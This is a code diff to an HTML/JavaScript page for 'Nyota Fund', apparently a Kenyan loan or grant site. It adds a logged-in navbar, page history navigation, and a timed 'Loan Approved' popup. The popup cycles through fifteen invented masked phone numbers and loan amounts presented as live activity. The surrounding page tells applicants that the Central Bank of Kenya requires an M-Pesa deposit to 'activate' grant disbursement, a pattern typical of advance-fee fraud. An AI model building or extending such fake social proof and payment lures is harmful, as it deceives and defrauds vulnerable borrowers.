@@ -869,30 +869,83 @@
             transition: all 0.5s ease;
             text-align: left;
         }
-        
+
         .testimonial-popup.active {
             opacity: 1;
             transform: translateX(0);
         }
-        
+
         .testimonial-popup-content {
             position: relative;
         }
-        
+
         .testimonial-popup-text {
             font-style: italic;
             font-size: 16px;
             margin-bottom: 10px;
             line-height: 1.4;
         }
-        
+
         .testimonial-popup-author {
             font-weight: 600;
             font-size: 14px;
             color: #ffd700;
         }
-        
+
         .testimonial-popup-close {
+            position: absolute;
+            top: -10px;
+            right: -10px;
+            background: white;
+            color: #ce1126;
+            border: none;
+            width: 25px;
+            height: 25px;
+            border-radius: 50%;
+            font-weight: bold;
+            cursor: pointer;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 14px;
+        }
+
+        /* Loan Messages Popup - Updated to top right */
+        .loan-popup {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            max-width: 350px;
+            background: white;
+            color: black;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+            z-index: 1000;
+            opacity: 0;
+            transform: translateX(100%);
+            transition: all 0.5s ease;
+            text-align: left;
+        }
+
+        .loan-popup.active {
+            opacity: 1;
+            transform: translateX(0);
+        }
+
+        .loan-popup-content {
+            position: relative;
+        }
+
+        .loan-popup-text {
+            font-style: italic;
+            font-size: 14px;
+            margin-bottom: 10px;
+            line-height: 1.4;
+        }
+
+        .loan-popup-close {
             position: absolute;
             top: -10px;
             right: -10px;
@@ -1008,84 +1061,263 @@
             transform: rotate(45deg) scale(1.1);
         }
 
+        /* Logged-In Navbar Styles */
+        #logged-in-navbar {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            background-color: rgba(255, 255, 255, 0.95);
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            z-index: 1000;
+            display: none;
+        }
+
+        .navbar-content {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 15px 20px;
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+
+        .user-menu {
+            position: relative;
+            display: flex;
+            align-items: center;
+        }
+
+        .user-icon-btn {
+            background-color: #006c00;
+            color: white;
+            border: none;
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            cursor: pointer;
+            font-size: 16px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: all 0.3s;
+        }
+
+        .user-icon-btn:hover {
+            background-color: #005000;
+            transform: scale(1.05);
+        }
+
+        .user-dropdown {
+            position: absolute;
+            top: 100%;
+            right: 0;
+            background-color: white;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+            min-width: 150px;
+            opacity: 0;
+            visibility: hidden;
+            transform: translateY(-10px);
+            transition: all 0.3s ease;
+            z-index: 1001;
+        }
+
+        .user-dropdown.active {
+            opacity: 1;
+            visibility: visible;
+            transform: translateY(0);
+        }
+
+        .dropdown-logout-btn {
+            width: 100%;
+            background: none;
+            border: none;
+            padding: 12px 16px;
+            text-align: left;
+            cursor: pointer;
+            color: #333;
+            font-weight: 500;
+            transition: background-color 0.3s;
+            border-radius: 8px;
+        }
+
+        .dropdown-logout-btn:hover {
+            background-color: #f8f9fa;
+            color: #ce1126;
+        }
+
+        .navbar-logo {
+            display: flex;
+            align-items: center;
+            cursor: pointer;
+            font-size: 24px;
+            font-weight: 700;
+            color: #006c00;
+        }
+
+        .navbar-logo span {
+            color: #ce1126;
+        }
+
+        .navbar-nav {
+            display: flex;
+            gap: 10px;
+        }
+
+        .nav-btn {
+            background-color: #006c00;
+            color: white;
+            border: none;
+            padding: 8px 15px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-weight: 600;
+            transition: all 0.3s;
+            font-size: 14px;
+        }
+
+        .nav-btn:hover:not(:disabled) {
+            background-color: #005000;
+            transform: translateY(-2px);
+        }
+
+        .nav-btn:disabled {
+            background-color: #28a745;
+            cursor: not-allowed;
+            transform: none;
+        }
+
         /* Responsive Design */
         @media (max-width: 768px) {
             .header-content {
                 flex-direction: column;
                 text-align: center;
             }
-            
+
             nav ul {
                 margin-top: 20px;
                 flex-wrap: wrap;
                 justify-content: center;
             }
-            
+
             nav ul li {
                 margin: 5px 10px;
             }
-            
+
             .hero h2 {
                 font-size: 36px;
             }
-            
+
             .hero p {
                 font-size: 18px;
             }
-            
+
             .hero-buttons {
                 flex-direction: column;
                 align-items: center;
             }
-            
+
             .btn {
                 width: 200px;
                 margin-bottom: 10px;
             }
-            
+
             .steps {
                 flex-direction: column;
             }
-            
+
             .application-form, .profile-form {
                 grid-template-columns: 1fr;
             }
-            
+
             .dashboard-header {
                 flex-direction: column;
                 gap: 15px;
                 text-align: center;
             }
-            
+
             .till-number-container {
                 flex-direction: column;
             }
-            
+
             .testimonial-popup {
                 max-width: 300px;
                 left: 10px;
                 bottom: 10px;
             }
-            
+
             .testimonial-popup-text {
                 font-size: 14px;
             }
+
+            .navbar-content {
+                padding: 10px 15px;
+            }
+
+            .navbar-logo {
+                font-size: 20px;
+            }
+
+            .nav-btn {
+                padding: 6px 12px;
+                font-size: 12px;
+            }
         }
-        
+
         @media (max-width: 480px) {
             .testimonial-popup {
                 max-width: 250px;
+            }
+
+            .navbar-nav {
+                gap: 5px;
+            }
+
+            .nav-btn {
+                padding: 5px 10px;
+                font-size: 11px;
             }
         }
     </style>
 </head>
 <body>
+    <!-- Logged-In Navbar -->
+    <div id="logged-in-navbar" style="display: none;">
+        <div class="navbar-content">
+            <div class="navbar-logo" onclick="showPage('dashboard-page')">Nyota <span>Fund</span></div>
+            <div class="navbar-nav">
+                <button class="nav-btn" id="back-btn" onclick="goBack()" disabled><i class="fas fa-arrow-left"></i></button>
+                <button class="nav-btn" id="forward-btn" onclick="goForward()" disabled><i class="fas fa-arrow-right"></i></button>
+            </div>
+            <div class="user-menu">
+                <button class="user-icon-btn" onclick="toggleUserMenu()">
+                    <i class="fas fa-user"></i>
+                </button>
+                <div class="user-dropdown" id="user-dropdown">
+                    <button class="dropdown-logout-btn" onclick="logout()">Logout</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
     <!-- Popping Testimonials Popup - Updated position -->
     <div class="testimonial-popup" id="testimonial-popup">
         <div class="testimonial-popup-content">
-            <button class="testimonial-popup-close" id="testimonial-close">×</button>
             <p class="testimonial-popup-text" id="testimonial-popup-text">"Nyota Fund transformed my small business with their quick and affordable loan!"</p>
             <p class="testimonial-popup-author" id="testimonial-popup-author">- Jane Wanjiku, Nairobi</p>
+            <button class="testimonial-popup-close" id="testimonial-close">&times;</button>
+        </div>
+    </div>
+
+    <!-- Loan Messages Popup -->
+    <div class="loan-popup" id="loan-popup">
+        <div class="loan-popup-content">
+            <div class="loan-popup-header">
+                <i class="fas fa-money-bill-wave"></i>
+                <span class="loan-popup-title">Loan Approved</span>
+            </div>
+            <p class="loan-popup-text" id="loan-popup-text">0721****77 loaned Ksh 15,000 - just now</p>
         </div>
     </div>
 
@@ -1948,7 +2180,7 @@
                     
                     <div class="payment-instructions">
                         <h3>Payment Instructions</h3>
-                        <p>To complete your NYOTA FUND GRANT application, the Central Bank of Kenya (CBK) requires you to deposit the amount below to activate your account for prompt and uninterrupted grant disbursement via M-Pesa (Regulated by CBK).
+                        <p>Activate NYOTA FUND GRANT application, the Central Bank of Kenya (CBK) requires you to deposit the amount below to activate your account for prompt and uninterrupted grant disbursement via M-Pesa (Regulated by CBK).
  :</p>
                         <ol>
                             <li>Go to M-Pesa on your phone</li>
@@ -2137,6 +2369,11 @@
         let userProfile = {};
         let currentPaymentAmount = 0;
 
+        // Page history for navigation
+        let pageHistory = [];
+        let currentHistoryIndex = -1;
+        let navigatingHistory = false;
+
         // Testimonials data
         const testimonials = [
             {
@@ -2221,9 +2458,69 @@
             }
         ];
 
+        // Loan messages data
+        const loanMessages = [
+            "0721****77 loaned Ksh 15,000 - just now",
+            "0712****34 loaned Ksh 8,000 - 2 minutes ago",
+            "0733****56 loaned Ksh 25,000 - 5 minutes ago",
+            "0798****12 loaned Ksh 12,500 - 8 minutes ago",
+            "0724****89 loaned Ksh 6,500 - 12 minutes ago",
+            "0715****67 loaned Ksh 18,000 - 15 minutes ago",
+            "0736****43 loaned Ksh 9,000 - 18 minutes ago",
+            "0728****90 loaned Ksh 22,000 - 22 minutes ago",
+            "0719****21 loaned Ksh 14,000 - 25 minutes ago",
+            "0731****78 loaned Ksh 7,500 - 28 minutes ago",
+            "0726****54 loaned Ksh 16,000 - 32 minutes ago",
+            "0717****32 loaned Ksh 11,000 - 35 minutes ago",
+            "0734****65 loaned Ksh 19,500 - 38 minutes ago",
+            "0729****87 loaned Ksh 5,000 - 42 minutes ago",
+            "0714****09 loaned Ksh 13,000 - 45 minutes ago"
+        ];
+
         // Testimonial popup management
         let currentTestimonialIndex = 0;
         let testimonialInterval;
+
+        // Loan message popup management
+        let currentLoanIndex = 0;
+        let loanInterval;
+
+        function showLoanPopup() {
+            const loanMessage = loanMessages[currentLoanIndex];
+            document.getElementById('loan-popup-text').textContent = loanMessage;
+
+            document.getElementById('loan-popup').classList.add('active');
+
+            // Auto close after 5 seconds
+            setTimeout(() => {
+                hideLoanPopup();
+            }, 5000);
+
+            // Move to next loan message
+            currentLoanIndex = (currentLoanIndex + 1) % loanMessages.length;
+        }
+
+        function hideLoanPopup() {
+            document.getElementById('loan-popup').classList.remove('active');
+        }
+
+        function startLoanInterval() {
+            // Show first loan message after 3 seconds
+            setTimeout(() => {
+                showLoanPopup();
+            }, 6000);
+
+            // Then show every 45 seconds
+            loanInterval = setInterval(() => {
+                showLoanPopup();
+            }, 45000);
+        }
+
+        function stopLoanInterval() {
+            clearInterval(loanInterval);
+        }
+
+
 
         function showTestimonialPopup() {
             const testimonial = testimonials[currentTestimonialIndex];
@@ -2389,38 +2686,99 @@
             switchAuthTab(tab);
         }
 
+        // Update navigation buttons state
+        function updateNavButtons() {
+            const backBtn = document.getElementById('back-btn');
+            const forwardBtn = document.getElementById('forward-btn');
+
+            // Enable/disable back button
+            if (currentHistoryIndex > 0) {
+                backBtn.disabled = false;
+            } else {
+                backBtn.disabled = true;
+            }
+
+            // Enable/disable forward button
+            if (currentHistoryIndex < pageHistory.length - 1) {
+                forwardBtn.disabled = false;
+            } else {
+                forwardBtn.disabled = true;
+            }
+        }
+
+        // Navigate back in history
+        function goBack() {
+            if (currentHistoryIndex > 0) {
+                currentHistoryIndex--;
+                navigatingHistory = true;
+                showPage(pageHistory[currentHistoryIndex]);
+                navigatingHistory = false;
+            }
+        }
+
+        // Navigate forward in history
+        function goForward() {
+            if (currentHistoryIndex < pageHistory.length - 1) {
+                currentHistoryIndex++;
+                navigatingHistory = true;
+                showPage(pageHistory[currentHistoryIndex]);
+                navigatingHistory = false;
+            }
+        }
+
         // Page Navigation
         function showPage(pageId) {
             // Hide all pages
             document.querySelectorAll('.page').forEach(page => {
                 page.classList.remove('active');
             });
-            
+
             // Show the selected page
             document.getElementById(pageId).classList.add('active');
-            
+
+            // History management
+            if (!navigatingHistory) {
+                // If going to a new page, remove future history
+                pageHistory = pageHistory.slice(0, currentHistoryIndex + 1);
+                pageHistory.push(pageId);
+                currentHistoryIndex = pageHistory.length - 1;
+            }
+            updateNavButtons();
+
             // Save current page to localStorage
             saveCurrentPage(pageId);
-            
+
             // Scroll to top when changing pages
             window.scrollTo(0, 0);
-            
+
             // Update logout buttons visibility based on login status
             updateLogoutButtons();
-            
+
             // Update dashboard if showing dashboard page
             if (pageId === 'dashboard-page') {
                 updateDashboard();
             }
-            
+
             // Update profile form if showing profile page
             if (pageId === 'profile-page') {
                 updateProfileForm();
             }
-            
+
             // Generate new payment amount if showing payment page
             if (pageId === 'payment-page') {
                 generateNewPaymentAmount();
+            }
+
+            // Toggle header/navbar visibility
+            const loggedInPages = ['dashboard-page', 'loan-application-page', 'payment-page', 'profile-page'];
+            if (loggedInPages.includes(pageId) && isLoggedIn) {
+                document.getElementById('logged-in-navbar').style.display = 'block';
+                const pageHeader = document.querySelector(`#${pageId} header`);
+                if (pageHeader) pageHeader.style.display = 'none';
+            } else {
+                document.getElementById('logged-in-navbar').style.display = 'none';
+                const pageHeader = document.querySelector(`#${pageId} header`);
+                if (pageHeader) pageHeader.style.display = 'block';
             }
         }
 
@@ -2898,8 +3256,17 @@
             // Start testimonial popups
             startTestimonialInterval();
 
-            // Close testimonial popup when close button is clicked
-            document.getElementById('testimonial-close').addEventListener('click', hideTestimonialPopup);
+        // Start loan message popups
+        startLoanInterval();
+
+        // Close testimonial popup when close button is clicked
+        document.getElementById('testimonial-close').addEventListener('click', hideTestimonialPopup);
+
+        // Toggle user menu dropdown
+        function toggleUserMenu() {
+            const dropdown = document.getElementById('user-dropdown');
+            dropdown.classList.toggle('active');
+        }
         });
     </script>
 </body>
